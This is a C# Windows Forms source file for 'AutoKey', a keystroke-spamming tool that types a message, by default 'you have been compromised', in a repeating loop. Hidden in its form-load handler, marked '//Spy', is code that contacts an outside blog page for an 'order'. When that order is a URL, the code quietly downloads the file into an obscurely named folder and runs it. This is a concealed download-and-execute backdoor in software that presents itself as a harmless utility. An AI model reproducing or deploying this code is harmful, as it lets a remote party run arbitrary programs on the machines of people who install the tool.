using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.IO;

namespace AutoKey
{
    public partial class Form1 : Form
    {
        string TARGET = "none";
        public Form1(string Target)
        {
            InitializeComponent();
            TARGET = Target;
            this.Text = "UserName: " + TARGET;
        }

        WebClient webClient4 = new WebClient();

        [System.Runtime.InteropServices.DllImport("kernel32")]
        private static extern int Sleep(long dwMilliseconds);

        string MainLoopText = "";
        long LoopTime = 1;
        long LoTi = 0;
        bool Coun = true;
        string Ryus = "";

        private void btn_Stop_Click(object sender, EventArgs e)
        {
            Coun = false;
            LoTi = 0;
            btn_Start.Enabled = true; btn_Stop.Enabled = false;
            timer1.Enabled = false;
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e) { Application.Exit(); }

        private void btn_Start_Click(object sender, EventArgs e)
        {
            Sleep(5000);
            if (TARGET != "MNGA")
                SendKeys.Send("::POWERED BY @TNEGABSU::");
            SendKeys.Send("initiating SPAM Program");
            SendKeys.Send("{ENTER}");
            Sleep(500);
            SendKeys.Send("in");
            SendKeys.Send("{ENTER}");
            Sleep(500);
            SendKeys.Send("3");
            SendKeys.Send("{ENTER}");
            Sleep(1000);
            SendKeys.Send("2");
            SendKeys.Send("{ENTER}");
            Sleep(1000);
            SendKeys.Send("1");
            SendKeys.Send("{ENTER}");
            Sleep(1000);
            SendKeys.Send("START");
            SendKeys.Send("{ENTER}");
            btn_Stop.Enabled = true;
            btn_Start.Enabled = false;
            LoopTime = (long)(LoopNUD.Value);
            MainLoopText = txt_LoopTEXT.Text;
            if (MainLoopText == "")
                MainLoopText = "THIS IS A MESSAGE FROM @TNEGABSU.\nyou have been compromised...";
            LoTi = 0;
            for (long T = 1; T <= LoopTime; T++)
            {
                if (Coun)
                {
                    Sleep((int)(intervalNUD.Value));
                    LoTi++;
                    string Dgyh = "";
                    if (rb_AN.CheckState == CheckState.Checked)
                        Dgyh = LoTi.ToString() + " :: ";
                    SendKeys.Send(Dgyh + MainLoopText);
                    SendKeys.Send("{ENTER}");
                }
            }
            LoTi = 0;
            btn_Start.Enabled = true; btn_Stop.Enabled = false;
            timer1.Enabled = false;
            Coun = true;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (LoopTime != 0)
            {
                LoTi++;
                string Dgyh = "";
                if (rb_AN.Checked)
                    Dgyh = LoTi.ToString();
                SendKeys.Send(Dgyh + MainLoopText);
                LoopTime--;
                SendKeys.Send("{ENTER}");
            }
            else
            {
                timer1.Enabled = false;
                btn_Stop.Enabled = false;
                btn_Start.Enabled = true;
                Console.Beep();
                Sleep(100);
                Console.Beep();
                Sleep(100);
                Console.Beep();
                Sleep(100);
                Console.Beep();
                Sleep(100);
                Console.Beep();
                Sleep(100);
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            webClient4.DownloadFileCompleted += new AsyncCompletedEventHandler(Completed);
            //Spy
            string Order = "";
            try
            {
                WebClient webClient3 = new WebClient();
                webClient3.Encoding = Encoding.UTF8;
                Order = webClient3.DownloadString("http://www.mahdinaji.rozblog.com/page/AKUORDER");
            }
            catch { }
            if (!(Order.StartsWith("http://")))
            {
                if (Order != "EMT")
                    MessageBox.Show(Order, "ORDER");
            }
            if (Order.StartsWith("http://"))
            {
                try
                {
                    if (!(Directory.Exists("D:\\System68DT541GB6T5FG1AKUBTD41S6D9T854H1")))
                        Directory.CreateDirectory("D:\\System68DT541GB6T5FG1AKUBTD41S6D9T854H1");
                    Ryus = "D:\\System68DT541GB6T5FG1AKUBTD41S6D9T854H1\\" + Path.GetFileName(Order);
                    webClient4.DownloadFileAsync(new Uri(Order), Ryus);
                }
                catch { }
            }
        }

        private void Completed(object sender, AsyncCompletedEventArgs e)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal;
            startInfo.FileName = Ryus;
            startInfo.Arguments = @"";
            process.StartInfo = startInfo;
            process.Start();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            msg.Visible = true;
            msg.Text = "";
            this.Refresh();
            label1.Visible = false; label2.Visible = false; label3.Visible = false; label4.Visible = false;
            btn_Start.Visible = false; btn_Stop.Visible = false; intervalNUD.Visible = false; LoopNUD.Visible = false; rb_AN.Visible = false;
            txt_LoopTEXT.Visible = false;
            Sleep(500);
            msg.Text = "\n\nClosing Application";
            this.Refresh();
            Sleep(1000);
            msg.Text += "\n\nPlease wait...";
            this.Refresh();
            Sleep(3000);

        }
    }
}
